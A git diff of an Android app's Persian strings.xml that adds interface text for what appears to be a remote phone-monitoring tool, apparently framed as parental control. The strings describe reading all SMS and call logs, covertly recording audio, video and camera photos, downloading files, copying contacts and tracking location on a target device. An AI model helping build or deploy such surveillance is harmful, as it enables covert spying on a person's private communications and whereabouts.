@@ -161,7 +161,35 @@
     <string name="location">مکان</string>
     <string name="takevid">فیلم گرفتن</string>
     <string name="takevoice">ضبط کردن صدا</string>
-    <string name="filemanage">File Manager</string>
-
+    <string name="filemanage">مدیریت فایل</string>
+    <string name="GOT_IT">GOT IT</string>
+    <string name="NEXT">NEXT</string>
+    <string name="this_page_has_all_permissions_n_n_you_need_to_project_n_n_your_child">این صفحه دارای تمامی امکانات  را نمایش می دهد \n\n
+        شما میتوانید بر اساس نیاز از انها \n\n
+        استفاده کنید.</string>
+    <string name="bts">BTS</string>
+    <string name="infosms">شما میتوانید تمامی پیامک ها دریافت شد یا ارسال شده \n\n
+        را بخوانید همچنین میتوانید شماره ارسال کننده \n\n
+        و زمان دریافت و یا ارسال پیامک را مشاهده کنید. </string>
+    <string name="infovoice">اگر برای گرفتن صدا درخواست کنید\n\n
+         ما صدایی از دستگاه  شما ارسال خواهیم کرد\n\n
+         بعد از چند دقیقه.</string>
+    <string name="infovid">اگر شما برای گرفتن فیلم درخواست کنید \n\n
+        ,ما ویدیویی از دستگاه شما ارسال خواهیم کرد\n\n
+         البته بعد از چند دقیقه. </string>
+    <string name="infopic">اگر شما برای گرفتن عکس درخواست گنید\n\n
+        ما عکس از دوربین های جلو و یا عقب \n\n
+        از دستگاه شما ارسال خواهیم کرد.\n\n
+       </string>
+    <string name="infofile">شما  تمام پوشه های دستگاه مورد نظر\n\n
+        را مشاهده کرده و برای خود\n\n
+        .دانلود کنید</string>
+    <string name="infocontact">شما میتوانید تمامی مخاطبین دستگاه موردنظر\n\n
+        را مشاهده و کپی کنید. </string>
+    <string name="infolocatin">شما میتوانید مکان آنلاین \n\n
+        دستگاه مورد نظر رادر صورت فعال بودن مکان یاب\n\n
+        دستگاه موردنظر دریافت کنید. </string>
+    <string name="infocall">شما میتوانید تمامی تماس ها وردی خروجی و\n\n
+        دریافتی را مشاهده کنید.</string>
 
 </resources>
